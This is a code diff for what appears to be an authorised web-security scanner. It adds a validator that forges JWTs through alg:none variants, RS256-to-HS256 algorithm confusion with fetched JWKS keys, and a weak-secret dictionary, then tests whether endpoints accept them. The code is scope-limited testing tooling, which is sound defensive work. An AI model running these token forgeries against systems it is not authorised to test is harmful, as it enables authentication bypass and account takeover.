@@ -25,7 +25,7 @@ import { xssOracle, sqliOracle, templateOracle, nosqlOracle, nonce } from "./inj
 import { startCallback, ssrfOracle } from "./ssrf.js";
 import { proveDomXss, domXssPayload } from "./domxss.js";
 import { traversalPayloads, lfiOracle } from "./lfi.js";
-import { forgeNoneToken, jwtNoneOracle } from "./jwt.js";
+import { forgeNoneToken, jwtNoneOracle, forgeNoneVariants, forgeHs256, jwkToPems, WEAK_SECRETS, jwtForgeOracle, corruptSig, headerOf, isRsaAlg, isHmacAlg } from "./jwt.js";
 import { massAssignOracle, buildBody } from "./massassign.js";
 import { corsOracle } from "./cors.js";
 import { reuseOracle } from "./reuse.js";
@@ -1125,7 +1125,70 @@ const exploreGraphqlValidator: Validator = {
   },
 };
 
-export const GENERIC_VALIDATORS: Validator[] = [exploreReplayValidator, exploreCrossActorValidator, exploreSecretValidator, exploreFileValidator, exploreInjectionValidator, exploreSsrfValidator, exploreStoredXssValidator, exploreDomXssValidator, exploreLfiValidator, exploreJwtNoneValidator, exploreMassAssignValidator, exploreCorsValidator, exploreReuseValidator, exploreGraphqlValidator];
+/* ---------------- explore.jwt-forge ---------------- */
+// Signature-verification attacks on a JWT: alg:none (+ case variants), algorithm
+// confusion (RS256->HS256 with the server's RSA public key as HMAC secret), and a
+// weak HMAC secret (small dictionary). A forged token is proven only when it is
+// ACCEPTED while the SAME token with a corrupted signature is REJECTED (so the
+// endpoint does verify signatures). Public keys are fetched generically from the
+// usual JWKS paths; no target signature. See jwt.test.ts.
+async function fetchJwkPems(base: string, scope: Scope, jwksUrl?: string): Promise<string[]> {
+  const paths = [jwksUrl, "/.well-known/jwks.json", "/jwks.json", "/oauth/jwks", "/api/jwks", "/.well-known/openid-configuration"].filter((p): p is string => !!p);
+  const pems: string[] = [];
+  for (const p of paths) {
+    const url = p.startsWith("http") ? p : base + p;
+    if (!scope.isHostAllowed(url)) continue;
+    try {
+      const r = await safeFetch(url, scope, { headers: { accept: "application/json" }, maxBytes: 64 * 1024 });
+      if (!ok2xx(r.status)) continue;
+      const j = JSON.parse(r.body) as { keys?: Record<string, unknown>[]; jwks_uri?: string };
+      if (j.jwks_uri && typeof j.jwks_uri === "string") { try { const r2 = await safeFetch(j.jwks_uri, scope, { headers: { accept: "application/json" } }); const j2 = JSON.parse(r2.body) as { keys?: Record<string, unknown>[] }; for (const k of j2.keys ?? []) pems.push(...jwkToPems(k)); } catch { /* skip */ } }
+      for (const k of j.keys ?? []) pems.push(...jwkToPems(k));
+    } catch { /* skip */ }
+  }
+  return [...new Set(pems)];
+}
+
+const exploreJwtForgeValidator: Validator = {
+  class: "explore.jwt-forge",
+  name: "JWT signature bypass (alg:none, algorithm confusion, weak secret)",
+  async validate(claim, env) {
+    const d = claim.detail as { url?: unknown; token?: unknown; override?: unknown; jwksUrl?: unknown };
+    const no = (reason: string): ClaimVerdict => ({ claimId: claim.id, state: "unproven", validator: this.name, reason });
+    if (typeof d.url !== "string" || typeof d.token !== "string") return no("need detail.url and detail.token (a valid JWT)");
+    const url = resolveExploreUrl(d.url, env.stagingUrl);
+    if (!url) return no("not an http(s) URL");
+    if (!env.scope.isHostAllowed(url)) return no("off-scope host");
+    const base = new URL(url).origin;
+    const override = d.override && typeof d.override === "object" ? (d.override as Record<string, unknown>) : undefined;
+    const hdr = headerOf(d.token);
+    const candidates: { how: string; token: string }[] = [];
+    for (const t of forgeNoneVariants(d.token, override)) candidates.push({ how: "alg:none", token: t });
+    if (isRsaAlg(hdr?.alg)) {
+      const pems = await fetchJwkPems(base, env.scope, typeof d.jwksUrl === "string" ? d.jwksUrl : undefined);
+      for (const pem of pems.slice(0, 8)) { const t = forgeHs256(d.token, pem, override); if (t) candidates.push({ how: "RS->HS algorithm confusion", token: t }); }
+    }
+    if (isHmacAlg(hdr?.alg) || !hdr?.alg) {
+      for (const s of WEAK_SECRETS) { const t = forgeHs256(d.token, s, override); if (t) candidates.push({ how: `weak secret "${s}"`, token: t }); }
+    }
+    if (!candidates.length) return no("no forgery candidate (need an RSA token for confusion, an HS token for weak-secret, or any for alg:none)");
+    const read = async (tok: string) => { const r = await safeFetch(url, env.scope, { method: "GET", headers: { authorization: `Bearer ${tok}` }, maxBytes: 256 * 1024 }); return { status: r.status, body: r.body }; };
+    const leads: string[] = [];
+    for (const c of candidates.slice(0, 28)) {
+      try {
+        const forged = await read(c.token);
+        if (!(forged.status >= 200 && forged.status < 300)) continue;
+        const control = await read(corruptSig(c.token));
+        const r = jwtForgeOracle({ forged, control });
+        if (r.verdict === "proven") return { claimId: claim.id, state: "proven", validator: this.name, reason: `JWT forgery (${c.how}) at ${pathOnly(url)}: ${r.reason}`, evidence: { request: `GET ${pathOnly(url)} with a ${c.how} token`, response: r.reason }, ceiling: "critical" };
+        if (r.verdict === "lead") leads.push(`${c.how}: ${r.reason}`);
+      } catch (e) { leads.push(`${c.how}: ${(e as Error).message}`); }
+    }
+    return no(leads.length ? `not proven; leads: ${leads.slice(0, 2).join("; ")}` : "no forged token was accepted");
+  },
+};
+
+export const GENERIC_VALIDATORS: Validator[] = [exploreReplayValidator, exploreCrossActorValidator, exploreSecretValidator, exploreFileValidator, exploreInjectionValidator, exploreSsrfValidator, exploreStoredXssValidator, exploreDomXssValidator, exploreLfiValidator, exploreJwtNoneValidator, exploreMassAssignValidator, exploreCorsValidator, exploreReuseValidator, exploreGraphqlValidator, exploreJwtForgeValidator];
 
 export const VALIDATORS: Validator[] = [authzValidator, baasValidator, headerValidator, replayValidator, fileReplayValidator, plainHttpValidator, ...GENERIC_VALIDATORS];
 
